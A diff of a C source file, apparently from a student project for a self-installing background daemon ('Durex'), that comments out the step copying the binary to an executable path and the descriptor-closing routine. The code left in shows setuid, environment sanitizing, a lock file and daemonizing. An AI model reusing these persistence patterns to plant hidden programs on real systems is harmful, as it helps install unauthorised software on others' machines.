@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2018/07/15 02:49:39 by root             ###   ########.fr       */
+/*   Updated: 2018/07/17 20:41:18 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,17 +20,17 @@
 
 #include "main.h"
 
-static void			closeFileDescriptors(void)
-{
-	struct rlimit	lim;
-	size_t			i;
+/* static void			closeFileDescriptors(void) */
+/* { */
+/* 	struct rlimit	lim; */
+/* 	size_t			i; */
 
-	i = 3;
-	if (getrlimit(RLIMIT_NOFILE, &lim) == -1)
-		return ;
-	while (i < lim.rlim_max)
-		close(i++);
-}
+/* 	i = 3; */
+/* 	if (getrlimit(RLIMIT_NOFILE, &lim) == -1) */
+/* 		return ; */
+/* 	while (i < lim.rlim_max) */
+/* 		close(i++); */
+/* } */
 
 static void			sanitizeEnvironment(void)
 {
@@ -79,17 +79,17 @@ static int			daemonize()
 
 int					main()
 {
-	int				fd;
+	/* int				fd; */
 
 	if (setuid(getuid()) == -1)
 		return 0;
-	if ((fd = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755)) != -1) {
-		install_binary(fd);
-		close(fd);
-		write(STDIN_FILENO, "gbourgeo\n", 9);
-		return 0;
-	}
-	closeFileDescriptors();
+	/* if ((fd = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755)) != -1) { */
+	/* 	install_binary(fd); */
+	/* 	close(fd); */
+	/* 	write(STDIN_FILENO, "gbourgeo\n", 9); */
+	/* 	return 0; */
+	/* } */
+	/* closeFileDescriptors(); */
 	sanitizeEnvironment();
 	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_EXCL | O_RDWR, 0600);
 	if (e.lock < 0)
